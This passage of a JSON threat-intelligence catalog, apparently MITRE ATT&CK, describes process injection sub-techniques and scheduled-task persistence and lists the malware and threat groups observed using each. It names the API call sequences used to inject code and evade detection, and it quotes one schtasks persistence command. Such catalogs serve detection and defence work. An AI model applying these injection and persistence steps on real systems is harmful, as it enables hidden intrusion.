"description": "ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process."}, {"id": "S0575", "name": "Conti", "description": "Conti has loaded an encrypted DLL into memory and then executes it."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can use a .NET-based DLL named RunPe6 for process injection."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi injects itself into the secure shell (SSH) process."}, {"id": "S0038", "name": "Duqu", "description": "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host)."}, {"id": "S0024", "name": "Dyre", "description": "Dyre injects into other processes to load modules."}, {"id": "S0081", "name": "Elise", "description": "Elise injects DLL files into iexplore.exe."}, {"id": "S0082", "name": "Emissary", "description": "Emissary injects its DLL file into a newly spawned Internet Explorer process."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed injecting in to Explorer.exe and other processes. "}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream FilepakMonitor component can inject into the Bka.exe process using the VirtualAllocEx, WriteProcessMemory and CreateRemoteThread APIs to load the DLL component."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to inject DLLs into specific processes."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to inject DLLs into processes."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can inject a DLL into rundll32.exe for execution."}, {"id": "S0135", "name": "HIDEDRV", "description": "HIDEDRV injects a DLL for Downdelph into the explorer.exe process."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe."}, {"id": "S0265", "name": "Kazuar", "description": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can perform process injection by using a reflective DLL."}, {"id": "G0032", "name": "Lazarus Group", "description": "A Lazarus Group malware sample performs reflective DLL injection."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has injected Mispadu\u2019s DLL into a process."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT."}, {"id": "S0449", "name": "Maze", "description": "Maze has injected the malware DLL into a target process."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex loads injecthelper.dll into a newly created rundll32.exe process."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe)."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can inject a DLL into rundll32.exe for execution."}, {"id": "S0457", "name": "Netwalker", "description": "The Netwalker DLL has been injected reflectively into the memory of a legitimate running process."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can inject its modules into various processes using reflective DLL loading."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy can inject a malicious DLL into a process."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process."}, {"id": "S0613", "name": "PS1", "description": "PS1 can inject its payload DLL Into memory."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can migrate into another process using reflective DLL injection."}, {"id": "G0024", "name": "Putter Panda", "description": "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe)."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use ImprovedReflectiveDLLInjection to deploy components."}, {"id": "S0055", "name": "RARSTONE", "description": "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA performs a reflective DLL injection using a given pid."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can perform DLL injection."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has injected its DLL component into EhStorAurhn.exe."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has injected a DLL into svchost.exe."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot creates a suspended svchost process and injects its DLL into it."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute loadfromfile, loadfromstorage, and loadfrommem to inject a DLL  from disk, storage, or memory respectively."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet injects an entire DLL into an existing, newly created, or preselected trusted process."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe."}, {"id": "G0092", "name": "TA505", "description": "TA505 has been seen injecting a DLL into winword.exe."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can perform DLL loading."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to inject DLLs for malicious plugins into running processes."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe."}, {"id": "G0010", "name": "Turla", "description": "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use DLL injection to load embedded files and modules."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell is injected into a shared SVCHOST process."}]}, {"name": "Portable Executable Injection", "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.002", "examples": [{"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has injected Latrodectus into the Explorer.exe process on comrpomised hosts."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak downloads an executable and injects it directly into a new process."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN can inject its decrypted payload into another process."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can use its own PE loader to execute payloads in memory."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has a module to inject a PE binary into a remote process."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject its backdoor as a portable executable into a target process."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can execute PE files in the address space of the specified process."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot, following payload decryption, creates a process hard-coded into the dropped (e.g., WerFault.exe) and injects the decrypted core modules into it."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process."}]}, {"name": "Thread Execution Hijacking", "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.003", "examples": [{"id": "S0168", "name": "Gazer", "description": "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot can create a suspended instance of a legitimate process (e.g., ctfmon.exe), allocate memory within the suspended process corresponding to Pikabot's core module, then redirect execution flow via SetContextThread API so that when the thread resumes the Pikabot core module is executed."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can use thread injection to inject shellcode into the process of security software."}]}, {"name": "Asynchronous Procedure Call", "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.\nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL).\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.004", "examples": [{"id": "S0438", "name": "Attor", "description": "Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can inject itself into a new svchost.exe -k netsvcs process using the asynchronous procedure call (APC) queue."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use asynchronous procedure call (APC) injection to execute commands received from C2."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has injected malicious code into a new svchost.exe process."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used ZwQueueApcThread to inject itself into remote processes."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject its code into a trusted process via the APC queue."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has written its payload into a newly-created EhStorAuthn.exe process using ZwWriteVirtualMemory and executed it using NtQueueApcThread and ZwAlertResumeThread."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use the QueueUserAPC API to execute shellcode on a compromised machine."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\""}]}, {"name": "Thread Local Storage", "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other Process Injection techniques such as Process Hollowing.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.005", "examples": [{"id": "S0386", "name": "Ursnif", "description": "Ursnif has injected code into target processes via thread local storage callbacks."}]}, {"name": "Ptrace System Calls", "description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction).\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.008", "examples": [{"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER can use PTRACE to attach to a targeted process to read process memory."}]}, {"name": "Proc Memory", "description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within /proc/[pid]/maps can be overwritten using dd.\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.009", "examples": [{"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity final payload installation includes mounting and binding to the \\/proc\\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts."}]}, {"name": "Extra Window Memory Injection", "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.011", "examples": [{"id": "S0091", "name": "Epic", "description": "Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process."}, {"id": "S0177", "name": "Power Loader", "description": "Power Loader overwrites Explorer\u2019s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."}]}, {"name": "Process Hollowing", "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.012", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can execute binaries through process hollowing."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use process hollowing for execution."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe."}, {"id": "S0354", "name": "Denis", "description": "Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%."}, {"id": "S0038", "name": "Duqu", "description": "Duqu is capable of loading executable code via process hollowing."}, {"id": "S0367", "name": "Emotet", "description": "Emotet uses a copy of certutil.exe stored in a temporary directory for process hollowing, starting the program in a suspended state before loading malicious code."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can inject its Delphi executable into ImagingDevices.exe using a process hollowing technique."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can use process hollowing to inject one of its trojans into another process."}, {"id": "S0483", "name": "IcedID", "description": "IcedID can inject a Cobalt Strike beacon into cmd.exe via process hallowing."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used process hollowing to inject itself into legitimate Windows process."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant."}, {"id": "S0198", "name": "NETWIRE", "description": "The NETWIRE payload has been injected into benign Microsoft executables via process hollowing."}, {"id": "S0229", "name": "Orz", "description": "Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use process hollowing to execute its main payload."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will execute a legitimate process, then suspend it to inject code for a Tor client into the process, followed by resumption of the process to enable Tor client execution."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can launch itself from a hollowed svchost.exe process."}, {"id": "S1018", "name": "Saint Bot", "description": "The Saint Bot loader has used API calls to spawn MSBuild.exe in a suspended state before injecting the decrypted Saint Bot binary into it."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can use RunPE to execute malicious payloads within a hollowed Windows process."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used process hollowing to execute CyberGate malware."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot injects into the svchost.exe process."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used process hollowing to inject into child processes."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility InstallUtil.exe."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can create a suspended notepad process and write shellcode to delete a file into the suspended process using NtWriteVirtualMemory."}]}, {"name": "Process Doppelg\u00e4nging", "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process.\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.\nProcess Doppelg\u00e4nging is implemented in 4 steps :\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.013", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar can inject into a target process using process doppelg\u00e4nging."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer has used Process Doppelg\u00e4nging to evade security software while deploying tools on compromised systems."}, {"id": "S0242", "name": "SynAck", "description": "SynAck abuses NTFS transactions to launch and conceal malicious processes."}]}, {"name": "VDSO Hijacking", "description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.014", "examples": []}, {"name": "ListPlanting", "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.", "detailed_description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a SysListView32 control.\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the SysListView32 child of the victim process window (via Windows API calls such as FindWindow and/or EnumWindows) or other Process Injection methods.\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function. For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.\nFinally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.", "id": "T1055.015", "examples": [{"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used ListPlanting to inject code into a trusted process."}]}]}, {"name": "Scheduled Task/Job", "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.", "detailed_description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.", "id": "T1053", "examples": [{"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution."}, {"id": "S0125", "name": "Remsec", "description": "Remsec schedules the execution one of its modules by creating a new scheduler task."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence."}], "sub_techniques": [{"name": "At", "description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.", "detailed_description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke at. If the at.deny exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the 